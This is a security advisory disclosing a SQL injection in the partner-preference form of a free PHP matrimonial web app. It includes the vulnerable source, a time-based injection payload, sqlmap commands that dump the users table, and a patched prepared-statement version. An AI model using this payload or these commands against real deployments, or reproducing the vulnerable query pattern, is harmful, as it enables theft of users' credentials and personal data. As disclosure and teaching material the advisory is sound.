**Title:** Critical SQL Injection in code-projects Matrimonial System in PHP An attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full database compromise. 

**Severity:** Critical 

**Researcher 1 :** Karan Parelkar

**Researcher 2 :** Anubhav Verma

**Executive Summary**

During an security assessment of the open-source Matrimonial System IN PHP, CSS, JS, AND MYSQL published on code-projects.org, a critical SQL Injection vulnerability was identified in  the Regular search functionality. 
The vulnerability exists because user-controlled input from the education parameter is concatenated directly into an SQL query without server-side sanitization or parameterized  statements. 

Successful exploitation allows an attacker to: 
• Execute arbitrary SQL queries  
• Enumerate databases  
• Extract sensitive user credentials  
• Obtain administrative account credentials  

Testing was performed only against locally deployed instance for research purposes. 


**Affected Product**

**Item Details** 
Matrimonial System IN PHP, CSS, JS, AND MYSQL
**Source:** https://code-projects.org/matrimonial-system-in-php-css-js-and-mysql-free-download/
**Version:**  1.0 
**Language:**  PHP 
**Database:** MySQL 
**Server:** Apache 
**Operating System:** Windows (XAMPP Test Environment)


**Vulnerability Classification**

CWE-89 
Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) OWASP Top 10 
A03:2021 – Injection 

**Vulnerability Details**

**Vulnerable Endpoint** 
POST /partner_preference.php

**Vulnerable Parameter** 
education

**Root Cause** 
The application constructs SQL statements by directly concatenating user-supplied values into SQL queries.
The vulnerable code is located in functions.php, inside the writepartnerprefs() function (called by partner_preference.php):

```javascript
function writepartnerprefs($id){
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $agemin=$_POST['agemin'];
        $agemax=$_POST['agemax'];
        $maritalstatus=$_POST['maritalstatus'];
        $complexion=$_POST['colour'];
        $height=$_POST['height'];
        $diet=$_POST['diet'];
        $religion=$_POST['religion'];
        $caste=$_POST['caste'];
        $mothertounge=$_POST['mothertounge'];
        $education=$_POST['education'];
        $occupation=$_POST['occupation'];
        $country=$_POST['country'];
        $descr=$_POST['descr'];

        $sql = "UPDATE
                   partnerprefs 
                SET
                   agemin = '$agemin',
                   agemax='$agemax',
                   maritalstatus = '$maritalstatus',
                   complexion = '$complexion',
                   height = '$height',
                   diet = '$diet',
                   religion='$religion',
                   caste = '$caste',
                   mothertounge = '$mothertounge',
                   education='$education',
                   descr = '$descr',
                   occupation = '$occupation',
                   country = '$country' 
                WHERE
                   custId = '$id'";

        $result = mysqlexec($sql);
        if ($result) {
            echo "<script>alert(\"Successfully updated Partner Preference\")</script>";
            echo "<script> window.location=\"userhome.php?id=$id\"</script>";

        }
        else{
            echo "Error";
        }

    }
}

```

Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the education parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.


**Proof of Concept**

Step 1 – Create profile page 

The vulnerable Partner Preference form accepts a user-controlled education parameter.

![POC](images/form%20page.png)

Step 2 – Vulnerable Source Code 

The writepartnerprefs function directly embeds POST parameters into the SQL query. 

![POC](images/vulnerable%20code.png)

The ‘ in education parameter leads to MySQL error confirming SQL injection 

![POC](images/sqli%20error%201.png)

![POC](images/sqli%20error%202.png)

Step 3 – Manual SQL Injection 

The intercepted POST request was modified by injecting a time-based SQL payload into the  education parameter. 
Payload: 

descr=test&agemin=18&agemax=30&maritalstatus=Single&colour=&height=180&diet=Veg&religion=Not+Applicable&caste=Roman+Cathaolic&mothertounge=&education=Primaryn' AND (SELECT 7500 FROM (SELECT(SLEEP(10)))wEXp) AND 'faZL'='faZ&occupation=test&country=Not+Applicab


![POC](images/sqli%20manual.png)

The application response was delayed by approximately 10 seconds, confirming successful  time-based SQL injection.


Step 4 – SQLMap Verification 
The captured request was supplied to SQLMap. 
command: ```python python .\sqlmap.py -r .\code_test_3.txt -p education –dbs ```


![POC](images/sqli%201.png)
![POC](images/sqli%202.png)

SQLMap confirmed that the education parameter is injectable using: 
• Error-based SQL Injection  
• Time-based SQL Injection 

```python python .\sqlmap.py -r .\code_test_3.txt -p education -D matrimony –tables```

![POC](images/sqli%203.png)

Database Enumeration 
Using SQLMap, multiple databases were successfully enumerated. 
information_schema 
matrimony
mysql 
performance_schema 
phpmyadmin 
test









Credential Disclosure 
The vulnerable SQL Injection allowed extraction of user records from the application's  database.

command: 
```python python .\sqlmap.py -r .\code_test_3.txt -p education -D matrimony -T users –dump```

![POC](images/sqli%204.png)
![POC](images/sqli%205.png)

The following sensitive information was retrieved: 
• Usernames  
• Passwords  
• User Level
•  email
• date of birth
• gender


**Impact**

Successful exploitation may allow an attacker to: 
• Execute arbitrary SQL statements  
• Enumerate databases  
• Dump sensitive application data  
• Obtain administrative credentials  
• Compromise confidentiality of stored information  

CVSS v3.1 
Base Score 
9.8 (Critical) 
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Remediation**

Developers should: 
• Replace dynamic SQL with prepared statements.  
• Use parameterized queries (PDO or MySQLi).  
• Validate and sanitize all user input.  
• Enable centralized logging and monitoring. 



**Secure Coding Example**

**Vulnerable**

```javascript
function writepartnerprefs($id){
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $agemin=$_POST['agemin'];
        $agemax=$_POST['agemax'];
        $maritalstatus=$_POST['maritalstatus'];
        $complexion=$_POST['colour'];
        $height=$_POST['height'];
        $diet=$_POST['diet'];
        $religion=$_POST['religion'];
        $caste=$_POST['caste'];
        $mothertounge=$_POST['mothertounge'];
        $education=$_POST['education'];
        $occupation=$_POST['occupation'];
        $country=$_POST['country'];
        $descr=$_POST['descr'];

        $sql = "UPDATE
                   partnerprefs 
                SET
                   agemin = '$agemin',
                   agemax='$agemax',
                   maritalstatus = '$maritalstatus',
                   complexion = '$complexion',
                   height = '$height',
                   diet = '$diet',
                   religion='$religion',
                   caste = '$caste',
                   mothertounge = '$mothertounge',
                   education='$education',
                   descr = '$descr',
                   occupation = '$occupation',
                   country = '$country' 
                WHERE
                   custId = '$id'";

        $result = mysqlexec($sql);
        if ($result) {
            echo "<script>alert(\"Successfully updated Partner Preference\")</script>";
            echo "<script> window.location=\"userhome.php?id=$id\"</script>";

        }
        else{
            echo "Error";
        }

    }
}
```

**Secure**

```javascript
function writepartnerprefs($id)
{
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        return;
    }

    require_once "includes/dbconn.php";

    // IMPORTANT: Prefer $_SESSION['cust_id'] instead of trusting $id from URL/POST.
    $id = filter_var($id, FILTER_VALIDATE_INT);

    if (!$id || $id <= 0) {
        exit('Invalid user');
    }

    // Safely read POST values
    $get = static function ($key) {
        return trim($_POST[$key] ?? '');
    };

    $agemin       = filter_var($_POST['agemin'] ?? null, FILTER_VALIDATE_INT);
    $agemax       = filter_var($_POST['agemax'] ?? null, FILTER_VALIDATE_INT);
    $maritalstatus = $get('maritalstatus');
    $complexion   = $get('colour');
    $height       = $get('height');
    $diet         = $get('diet');
    $religion     = $get('religion');
    $caste        = $get('caste');
    $mothertounge = $get('mothertounge');
    $education    = $get('education');
    $occupation   = $get('occupation');
    $country      = $get('country');
    $descr        = $get('descr');

    // Basic validation
    if ($agemin === false || $agemax === false ||
        $agemin < 18 || $agemax < $agemin || $agemax > 100) {
        exit('Invalid age range');
    }

    // Prepared statement prevents SQL Injection
    $sql = "UPDATE partnerprefs SET
                agemin = ?,
                agemax = ?,
                maritalstatus = ?,
                complexion = ?,
                height = ?,
                diet = ?,
                religion = ?,
                caste = ?,
                mothertounge = ?,
                education = ?,
                descr = ?,
                occupation = ?,
                country = ?
            WHERE custId = ?";

    $stmt = $conn->prepare($sql);

    if (!$stmt) {
        error_log($conn->error);
        exit('Database error');
    }

    $stmt->bind_param(
        "iisssssssssssi",
        $agemin,
        $agemax,
        $maritalstatus,
        $complexion,
        $height,
        $diet,
        $religion,
        $caste,
        $mothertounge,
        $education,
        $descr,
        $occupation,
        $country,
        $id
    );

    if ($stmt->execute()) {
        $stmt->close();

        echo '<script>
                alert("Successfully updated Partner Preference");
                window.location.href = "userhome.php";
              </script>';
        exit;
    }

    error_log($stmt->error);
    $stmt->close();

    echo "Unable to update partner preference.";
}

```

**References**

• Product Inventory System in PHP (code-projects.org) (https://code-projects.org/matrimonial-system-in-php-css-js-and-mysql-free-download/) 
• CWE-89 – SQL Injection  
• OWASP SQL Injection Prevention Cheat Sheet  
• OWASP Top 10 2021 – Injection  

**Researchers Information**

**Researcher - 1**

Name: Karan Parelkar 
Independent Security Researcher 
Email: karan.parelkar2005@gmail.com 
GitHub: https://github.com/KaranParelkar 
LinkedIn: https://www.linkedin.com/in/karan-parelkar-6a370125b/

**Researcher - 2**

Name: Anubhav Verma
Independent Security Researcher 
Email: avdzav10@gmail.com
GitHub: https://github.com/anubhavv106
LinkedIn: https://www.linkedin.com/in/anubhav-verma-7123a1232/
